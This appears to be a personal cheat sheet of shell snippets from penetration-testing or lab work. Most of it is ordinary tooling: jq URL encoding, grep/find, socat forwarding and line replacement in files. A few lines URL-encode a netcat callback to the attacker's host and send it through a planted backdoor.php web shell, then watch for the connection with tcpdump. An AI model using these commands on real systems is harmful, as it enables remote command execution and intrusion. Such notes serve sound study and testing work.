
```sh
for i in $(seq 1 254); do echo 192.168.50.$i; done > target.txt
```




```sh
CMD="nc $LHOST $LPORT"
PAYLOAD=$(echo -n $CMD | jq -sRr @uri)

curl "http://$RHOST/backdoor.php?cmd=$PAYLOAD"
curl -G --data-urlcode "cmd=$CMD" "http://$RHOST/backdoor.php"

sudo tcpdump -nv tcp -i tun0 src host $RHOST and dst port $LPORT
```



for i in $(ls /home); do cd /home/$i && /bin/tar -zcf /etc/backups/home-$i.tgz *; done




echo '{"a": "text with / and spaces &"}' | jq '@uri "\(.a)"'
# output
# "texte%20with%20%2F%20and%20spaces%20%26"

echo '{"search":"what is jq?"}' | jq '@uri "https://www.google.com/search?q=\(.search)"'
# output
# "https://www.google.com/search?q=what%20is%20jq%3F"

printf %s "same text as above with / and spaces &"|jq -sRr @uri
# output
# same%20text%20as%20above%20with%20%2F%20and%20spaces%20%26






Use grep's -l option to list the paths of files with matching contents, then print the contents of these files using cat.

grep -lR 'regex' 'directory' | xargs -d '\n' cat 

The command from above cannot handle filenames with newlines in them. To overcome the filename with newlines issue and also allow more sophisticated checks you can use the find command.

The following command prints the content of all regular files in directory.

find 'directory' -type f -exec cat {} +

To print only the content of files whose content matches the regexes regex1 and regex2, use

find 'directory' -type f \
     -exec grep -q 'regex1' {} \; -and \
     -exec grep -q 'regex2' {} \; \
     -exec cat {} +

The linebreaks are only for better readability. Without the \ you can write everything into one line.
Note the -q for grep. That option supresses grep's output. grep's exit status will tell find whether to list a file or not.





sudo ip addr add 192.168.178.49/24 dev vboxnet0
sudo socat TCP-LISTEN:80,fork TCP:192.168.56.114:80

sudo ip addr del 192.168.178.33/24 dev vboxnet0


# To replace the content of a specific line number n in a file on a Linux machine

sed -i "${n}s/.*/NEW_CONTENT/" file.txt
awk -v n=LINE_NUMBER -v new_content="NEW_CONTENT" 'NR == n {print new_content; next} {print}' file.txt > temp.txt && mv temp.txt file.txt

ed -s file.txt <<EOF
n
c
NEW_CONTENT
.
w
q
EOF

head -n $((LINE_NUMBER-1)) file.txt > temp.txt
echo "NEW_CONTENT" >> temp.txt
tail -n +$((LINE_NUMBER+1)) file.txt >> temp.txt
mv temp.txt file.txt
